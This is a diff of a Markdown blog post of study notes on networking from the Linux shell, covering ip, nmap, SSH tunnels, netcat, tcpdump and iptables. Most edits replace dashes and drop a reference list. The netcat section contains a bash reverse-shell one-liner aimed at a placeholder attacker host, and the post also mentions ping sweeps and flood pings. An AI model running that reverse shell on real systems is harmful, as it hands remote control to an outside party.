@@ -13,7 +13,7 @@ tags:
   - ssh
   - iptables
 author: muhammed
-description: Chapter 7 of Linux Shell Scripting Cookbook — networking from the command line, SSH, port forwarding, firewalls, and traffic analysis
+description: Chapter 7 of Linux Shell Scripting Cookbook - networking from the command line, SSH, port forwarding, firewalls, and traffic analysis
 toc: true
 pin: false
 math: false
@@ -24,13 +24,13 @@ Link: "[[Shell Scripting Notes]]"
 
 # Chapter Overview
 
-This chapter covers everything networking from the shell — configuring interfaces, probing the network, SSH tunnelling, file transfer, firewalls, and traffic analysis. Most of these tools are what you'd reach for during a CTF, a pentest, or just managing remote infrastructure.
+This chapter covers everything networking from the shell - configuring interfaces, probing the network, SSH tunnelling, file transfer, firewalls, and traffic analysis. Most of these tools are what you'd reach for during a CTF, a pentest, or just managing remote infrastructure.
 
 ---
 
 ## Setting Up the Network
 
-### ip — the modern tool (replaces ifconfig)
+### ip: the modern tool (replaces ifconfig)
 
 ```bash
 ip addr                          # show all interfaces and IPs
@@ -58,7 +58,7 @@ ip route add default via 192.168.1.1          # default gateway
 ip route del 10.0.0.0/8                       # delete route
 ```
 
-### ifconfig (legacy — still common)
+### ifconfig (legacy: still common)
 
 ```bash
 ifconfig                         # show all interfaces
@@ -118,16 +118,16 @@ ping -i 0.5 google.com           # interval between pings (0.5s)
 ping -s 1000 google.com          # packet size 1000 bytes
 ping -t 64 google.com            # TTL (time to live)
 ping -W 2 google.com             # timeout per packet (2s)
-ping -q google.com               # quiet — only show summary
+ping -q google.com               # quiet - only show summary
 ```
 
-**Flood ping** (requires root — stress test):
+**Flood ping** (requires root - stress test):
 
 ```bash
 ping -f -c 1000 192.168.1.1     # send 1000 pings as fast as possible
 ```
 
-**Ping sweep — check a whole subnet:**
+**Ping sweep - check a whole subnet:**
 
 ```bash
 for i in {1..254}; do
@@ -207,7 +207,7 @@ arp-scan --localnet              # scan local network using ARP
 arp-scan 192.168.1.0/24
 ```
 
-ARP-based — more reliable than ping (ICMP can be blocked, ARP can't on a local network).
+ARP-based - more reliable than ping (ICMP can be blocked, ARP can't on a local network).
 
 ### Extract live IPs from nmap output
 
@@ -287,7 +287,7 @@ done
 
 ## Transferring Files Through the Network
 
-### scp — secure copy
+### scp: secure copy
 
 ```bash
 scp file.txt user@host:/remote/path/          # local → remote
@@ -305,7 +305,7 @@ rsync -avz -e "ssh -p 2222" /local/ user@host:/remote/  # custom port
 rsync -avzP user@host:/remote/ /local/        # -P shows progress + resumes
 ```
 
-### sftp — interactive file transfer
+### sftp: interactive file transfer
 
 ```bash
 sftp user@host
@@ -341,7 +341,7 @@ nc -l -p 9999 > received_file.tar.gz
 nc receiver_ip 9999 < file.tar.gz
 ```
 
-Fast but no encryption — only use on trusted networks.
+Fast but no encryption - only use on trusted networks.
 
 ---
 
@@ -364,7 +364,7 @@ iw dev wlan0 scan                 # scan for available networks
 iw dev wlan0 link                 # connection info (signal, SSID)
 ```
 
-### nmcli (NetworkManager — recommended)
+### nmcli (NetworkManager: recommended)
 
 ```bash
 nmcli device wifi list            # list available networks
@@ -397,17 +397,17 @@ dhclient wlan0                    # get IP via DHCP
 
 ## Passwordless Auto-Login with SSH
 
-SSH key authentication is faster, more secure, and required for automation — no password prompts.
+SSH key authentication is faster, more secure, and required for automation - no password prompts.
 
 ### Step 1: Generate a key pair
 
 ```bash
-ssh-keygen -t ed25519 -C "omar@machine"     # modern — recommended
-ssh-keygen -t rsa -b 4096 -C "omar@machine" # RSA — wider compatibility
+ssh-keygen -t ed25519 -C "omar@machine"     # modern - recommended
+ssh-keygen -t rsa -b 4096 -C "omar@machine" # RSA - wider compatibility
 ```
 
-- Private key: `~/.ssh/id_ed25519` — never share this
-- Public key: `~/.ssh/id_ed25519.pub` — this goes on the server
+- Private key: `~/.ssh/id_ed25519` - never share this
+- Public key: `~/.ssh/id_ed25519.pub` - this goes on the server
 
 ### Step 2: Copy public key to server
 
@@ -452,7 +452,7 @@ SSH tunnels encrypt and forward network traffic through SSH connections. Useful 
 
 ### Local port forwarding (-L)
 
-Forward a local port to a remote service — you access it on your machine, traffic goes through SSH to the remote.
+Forward a local port to a remote service - you access it on your machine, traffic goes through SSH to the remote.
 
 ```bash
 ssh -L 8080:localhost:80 user@server
@@ -469,7 +469,7 @@ ssh -L 3306:db-server:3306 user@jump-host
 
 ### Remote port forwarding (-R)
 
-Expose a local service to the remote server — useful for making a local service accessible from the internet.
+Expose a local service to the remote server - useful for making a local service accessible from the internet.
 
 ```bash
 ssh -R 9090:localhost:3000 user@server
@@ -477,9 +477,9 @@ ssh -R 9090:localhost:3000 user@server
 
 Now port 9090 on the server reaches port 3000 on your local machine.
 
-### Dynamic port forwarding (-D) — SOCKS proxy
+### Dynamic port forwarding (-D): SOCKS proxy
 
-Creates a SOCKS proxy on your local machine — all traffic routed through it goes via the SSH server.
+Creates a SOCKS proxy on your local machine - all traffic routed through it goes via the SSH server.
 
 ```bash
 ssh -D 1080 user@server
@@ -517,7 +517,7 @@ ssh -fNL 8080:localhost:80 user@server
 
 ## Mounting a Remote Drive at a Local Mount Point
 
-### SSHFS — mount remote directory over SSH
+### SSHFS: mount remote directory over SSH
 
 ```bash
 # Mount
@@ -540,7 +540,7 @@ Install: `apt install sshfs`
 user@host:/remote /mnt/remote fuse.sshfs defaults,_netdev,reconnect 0 0
 ```
 
-### NFS — Network File System
+### NFS: Network File System
 
 ```bash
 # Server side
@@ -555,7 +555,7 @@ mount -t nfs server:/shared/dir /mnt/nfs
 # server:/shared /mnt/nfs nfs defaults,_netdev 0 0
 ```
 
-### SMB/CIFS — Windows shares
+### SMB/CIFS: Windows shares
 
 ```bash
 mount -t cifs //server/share /mnt/smb \
@@ -576,7 +576,7 @@ domain=WORKGROUP
 
 ## Network Traffic and Port Analysis
 
-### ss — socket statistics (modern netstat)
+### ss: socket statistics (modern netstat)
 
 ```bash
 ss -tuln                    # listening TCP and UDP ports
@@ -607,7 +607,7 @@ nmap -p- 192.168.1.100      # all 65535 ports
 nmap -p 22,80,443 192.168.1.100  # specific ports
 ```
 
-### tcpdump — packet capture
+### tcpdump: packet capture
 
 ```bash
 tcpdump -i eth0                          # capture on eth0
@@ -620,7 +620,7 @@ tcpdump -i eth0 -X port 80              # show hex + ASCII payload
 tcpdump -i any                           # capture on all interfaces
 ```
 
-### iftop — real-time bandwidth per connection
+### iftop: real-time bandwidth per connection
 
 ```bash
 iftop                        # interactive bandwidth monitor
@@ -628,14 +628,14 @@ iftop -i eth0                # specific interface
 iftop -n                     # no DNS lookups
 ```
 
-### nethogs — bandwidth per process
+### nethogs: bandwidth per process
 
 ```bash
 nethogs                      # show which process uses the most bandwidth
 nethogs eth0                 # specific interface
 ```
 
-### nload — total bandwidth graph
+### nload: total bandwidth graph
 
 ```bash
 nload                        # simple incoming/outgoing bandwidth graph
@@ -646,7 +646,7 @@ nload eth0
 
 ## Creating Arbitrary Sockets
 
-### netcat (nc) — the network Swiss Army knife
+### netcat (nc): the network Swiss Army knife
 
 **Listen on a port:**
 
@@ -693,7 +693,7 @@ nc -lvnp 4444
 bash -i >& /dev/tcp/attacker_ip/4444 0>&1
 ```
 
-### /dev/tcp — bash built-in TCP
+### /dev/tcp: bash built-in TCP
 
 Bash can open TCP connections natively without nc:
 
@@ -711,7 +711,7 @@ timeout 1 bash -c "cat < /dev/null > /dev/tcp/host/port" 2>/dev/null && \
   echo "open" || echo "closed"
 ```
 
-### socat — more powerful nc
+### socat: more powerful nc
 
 ```bash
 socat TCP-LISTEN:9999,fork -          # listen and echo stdin
@@ -726,7 +726,7 @@ socat TCP-LISTEN:443,fork,reuseaddr OPENSSL-LISTEN:443,cert=server.pem  # TLS li
 
 ### IP forwarding (NAT gateway)
 
-Turn your Linux machine into a router — share one internet connection with other machines.
+Turn your Linux machine into a router - share one internet connection with other machines.
 
 ```bash
 # Enable IP forwarding
@@ -767,13 +767,13 @@ iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE
 
 ## Basic Firewall with iptables
 
-`iptables` filters network packets based on rules. Rules are processed top to bottom — first match wins.
+`iptables` filters network packets based on rules. Rules are processed top to bottom - first match wins.
 
 ### Chains and tables
 
-- **INPUT** — packets destined for the local machine
-- **OUTPUT** — packets leaving the local machine
-- **FORWARD** — packets being routed through the machine
+- **INPUT** - packets destined for the local machine
+- **OUTPUT** - packets leaving the local machine
+- **FORWARD** - packets being routed through the machine
 
 ### Viewing rules
 
@@ -827,7 +827,7 @@ iptables -A INPUT -p tcp --dport 8080 -j REJECT  # reject (sends RST, not silent
 
 ```bash
 iptables -D INPUT 3                  # delete rule by line number
-iptables -F                          # flush all rules (dangerous — loses all rules)
+iptables -F                          # flush all rules (dangerous - loses all rules)
 iptables -F INPUT                    # flush only INPUT chain
 iptables -X                          # delete all custom chains
 ```
@@ -856,7 +856,7 @@ iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
   -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
 ```
 
-### ufw — simplified iptables frontend
+### ufw: simplified iptables frontend
 
 ```bash
 ufw enable                           # enable firewall
@@ -872,24 +872,12 @@ ufw reset                            # reset all rules
 
 ---
 
-## 📚 References
-
-<div class="references">
-<ul>
-  <li><a href="https://www.packtpub.com/product/linux-shell-scripting-cookbook/9781785881985" target="_blank">Linux Shell Scripting Cookbook — Packt</a></li>
-  <li><a href="https://www.openssh.com/manual.html" target="_blank">OpenSSH Manual</a></li>
-  <li><a href="https://nmap.org/book/man.html" target="_blank">Nmap Reference Guide</a></li>
-  <li><a href="https://www.netfilter.org/documentation/" target="_blank">iptables/netfilter Documentation</a></li>
-</ul>
-</div>
-
 ---
 
-##  You can find me online at:
+## You can find me online at:
 
 ![My signature image](/assets/img/footer-signature.png)
 
-- **X (Twitter):** [Md3omer](https://x.com/Md3omer )
 - **GitHub:** [Mhdomer](https://github.com/Mhdomer)
 - **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
-- **Tryhackme:**  [nonlouy](https://tryhackme.com/p/nonlouy)
+- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
